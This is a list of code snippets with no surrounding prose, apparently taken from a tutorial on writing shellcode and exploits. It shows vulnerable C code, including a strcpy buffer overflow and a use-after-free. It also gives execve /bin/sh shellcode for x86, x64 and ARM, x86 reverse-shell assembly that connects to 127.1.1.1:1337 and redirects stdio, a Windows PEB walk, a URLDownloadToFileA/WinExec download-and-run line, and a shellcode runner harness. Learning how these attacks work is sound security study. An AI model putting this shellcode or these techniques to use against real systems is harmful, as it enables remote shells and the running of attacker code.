["```\nint vulnerable(char *arg)\n{\n  char Buffer[80];\n  strcpy(Buffer, arg);\n  return 0;\n}\nint main (int argc, char *argv[])\n{\n  // the command line argument\n  vulnerable(argv[1]);\n}\n```", "```\nOBJECT Buf = malloc(sizeof(OBJECT));\nBuf->address_to_a_func = IsAdmin();\nfree(Buf);\n.... <some code> ....\n// execute this function after the buffer was freed\n(Buf->address_to_a_func)();\n```", "```\n  call next_ins\nnext_ins:\n  pop eax ; now eax stores the absolute address of next_ins\n```", "```\n  call next_ins\nnext_ins:\n  pop eax ; now eax has the absolute address of next_ins\n  add eax, <data_sec – next_ins> ; now, eax stores the address of the data section\ndata_sec:\n  db 'Hello, World',0\n```", "```\n_start:\n  fldz\n  fstenv [esp-0xc]\n  pop eax\n  add eax, <data_sec – _start>\ndata_sec:\n  db 'Hello, World', 0\n```", "```\n  jmp _end\n_start:\n  xor ecx, ecx\n  xor eax, eax\n  pop ebx     ; load /bin/sh in ebx\n  mov al, 11   ; execve syscall ID\n  xor ecx, ecx ; no arguments in ecx\n  int 0x80     ; syscall\n  mov al, 1    ; exit syscall ID\n  xor ebx,ebx  ; no errors\n  int 0x80     ; syscall\n_end:\n  call _start\n  db '/bin/sh',0\n```", "```\n    int execve(const char *filename, char *const argv[], char\n    *const envp[]);\n    ```", "```\n    void _exit(int status);\n    ```", "```\nxor rdx, rdx\npush rdx    ; null bytes after the /bin/sh\nmov rax, 0x68732f2f6e69622f ; /bin/sh\npush rax\nmov rdi, rsp\npush rdx    ; null arguments for /bin/sh\npush rdi\nmov rsi, rsp\nxor rax, rax\nmov al, 0x3b  ; execve system call\nsyscall\nxor rdi, rdi\nmov rax, 0x3c ; exit system call\nsyscall\n```", "```\n    int socket(int domain, int type, int protocol);\n    ```", "```\nsocket(AF_INET, SOCK_STREAM, IPPROTO_IP);\n```", "```\nxor edx, edx  ; cleanup edx\npush edx      ; protocol=IPPROTO_IP (0x0)\npush 0x1      ; socket_type=SOCK_STREAM (0x1) \npush 0x2      ; socket_family=AF_INET (0x2)\nmov ecx, esp  ; pointer to socket() args\nxor ebx, ebx\nmov bl, 0x1   ; SYS_SOCKET\nxor eax,eax\nmov al, 0x66  ; socketcall syscall ID\nint 0x80\nxchg edx, eax ; edx=sockfd (the returned socket)\n```", "```\nSYS_SOCKET 1\nSYS_BIND 2\nSYS_CONNECT 3\nSYS_LISTEN 4\nSYS_ACCEPT 5\n```", "```\n    int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);\n    ```", "```\npush 0x0101017f ; sin_addr=127.1.1.1 (network byte order)\nxor ecx, ecx\nmov cx, 0x3905\npush cx      ; sin_port=1337 (network byte order)\ninc ebx\npush bx      ; sin_family=AF_INET (0x2)\nmov ecx, esp    ; save pointer to sockaddr struct\npush 0x10      ; addrlen=16\npush ecx      ; pointer to sockaddr\npush edx      ; sockfd\nmov ecx, esp    ; save pointer to sockaddr_in struct\ninc ebx      ; sys_connect (0x3)\nint 0x80      ; exec sys_connect\n```", "```\n      push 0x2\n      pop ecx       ; set loop counter\n      xchg ebx, edx ; save sockfd\n    ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)\n    loop:\n      mov al, 0x3f  ; sys_dup2 systemcall ID\n      int 0x80\n      dec ecx       ; decrement loop-counter\n      jns loop      ; as long as SF is not set -> continue\n    ```", "```\n_start:\n  add r0, pc, #12 \n  mov r1, #0\n  mov r2, #0\n  mov r7, #11 ; execve system call ID\n  svc #1\n.ascii \"/bin/sh\\0\"\n```", "```\nmov eax,dword ptr fs:[30h]\nmov eax,dword ptr [eax+0Ch]\nmov ebx,dword ptr [eax+1Ch]\nmov ebx,dword ptr [ebx]\nmov esi,dword ptr [ebx+8h]\n```", "```\nURLDownloadToFile(LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, _Reserved_ DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);\n```", "```\nURLDownloadToFileA(0,\"https://localhost:4444/calc.exe\",\"calc.exe\",0,0); WinExec(\"calc.exe\",SW_HIDE);\n```", "```\nunsigned char code[] = {<output of xxd –i against the shellcode>};\nint main(int argc, char **argv)\n{\n        int (*func)();\n        func = (int (*)()) code;\n        (int)(*func)();\n}\n```", "```\nmov eax, 1\npop ebx\nret\n```"]